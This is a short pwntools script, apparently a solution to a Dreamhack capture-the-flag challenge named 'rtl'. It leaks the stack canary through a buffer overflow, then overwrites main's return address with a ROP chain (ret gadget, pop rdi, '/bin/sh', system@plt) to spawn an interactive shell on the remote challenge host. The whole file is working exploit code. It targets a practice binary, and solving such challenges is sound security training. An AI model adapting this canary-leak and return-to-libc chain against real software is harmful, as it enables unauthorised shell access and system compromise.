from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/rtl')
else:
    r = remote('host1.dreamhack.games', 13755)

sa = r.sendafter

binsh = 0x400874  # "/bin/sh"
system_plt = 0x4005d0  # PLT of system()
pop_rdi = 0x400853  # pop rdi; ret
ret = 0x400285  # ret gadget

# leak canary
sa('Buf: ', 'a' * 0x39)
r.recvuntil('Buf: ' + 'a' * 0x39)
canary = u64(r.recvn(7).rjust(8, b'\x00'))

# overwrite return address of main()
# call system("/bin/sh")
payload = b'a' * 0x38  # dummy
payload += p64(canary)  # canary
payload += b'a' * 8  # sfp
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)
sa('Buf: ', payload)

r.interactive()